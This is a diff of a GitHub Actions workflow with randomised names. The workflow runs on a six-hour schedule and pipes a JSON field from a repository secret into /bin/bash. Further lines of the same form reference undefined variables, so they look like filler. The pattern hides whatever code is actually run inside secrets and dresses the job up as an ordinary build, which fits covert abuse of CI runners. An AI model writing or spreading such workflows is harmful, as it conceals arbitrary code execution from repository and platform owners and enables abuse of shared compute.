@@ -1,27 +1,32 @@
 name: ligubu6751
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '15 4/6 * * *'
+    - cron: '57 1/6 * * *'
 
-jobs:  # 30170
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: ligubu6751
         env:
-          bqxxl2: ${{ secrets.bqxxl2 }}
+          t4: ${{ secrets.t4 }}
         run: |
-          echo $bqxxl2 | jq -r .lx925 | /bin/bash
-          echo $dzyij99471 | jq -r .co75 | /bin/bash
-          echo $n4440 | jq -r .emjy4 | /bin/bash
-          echo $p825 | jq -r .ni956 | /bin/bash
-          echo $uik921 | jq -r .s49536 | /bin/bash
-          echo $imbv4 | jq -r .kpg1 | /bin/bash
-          echo $bzf04656 | jq -r .f0 | /bin/bash
-          echo $orc27466 | jq -r .sjy5 | /bin/bash
-          echo $dbx732 | jq -r .ri26507 | /bin/bash
-          echo $yxz652 | jq -r .drlw50 | /bin/bash
-          echo $iktzo220 | jq -r .jyt59981 | /bin/bash
+          echo $t4 | jq -r .m98 | /bin/bash
+          echo $uvgqu77606 | jq -r .eue73 | /bin/bash
+          echo $iu0 | jq -r .gvmu87767 | /bin/bash
+          echo $msv9631 | jq -r .mwrm4194 | /bin/bash
+          echo $ajmqr0917 | jq -r .qwe30299 | /bin/bash
+          echo $om60146 | jq -r .lnp764 | /bin/bash
+          echo $u9 | jq -r .mmx2 | /bin/bash
+          echo $iwt0 | jq -r .d95915 | /bin/bash
+          echo $o479 | jq -r .dbmva83 | /bin/bash
+          echo $l2 | jq -r .pdax95582 | /bin/bash
+          echo $nww7 | jq -r .zapp919 | /bin/bash
+          echo $lxwsm87 | jq -r .grvlh3 | /bin/bash
+          echo $nlon6366 | jq -r .trjul96058 | /bin/bash
+          echo $lbk138 | jq -r .u037 | /bin/bash
+          echo $gra31 | jq -r .gl7 | /bin/bash
 
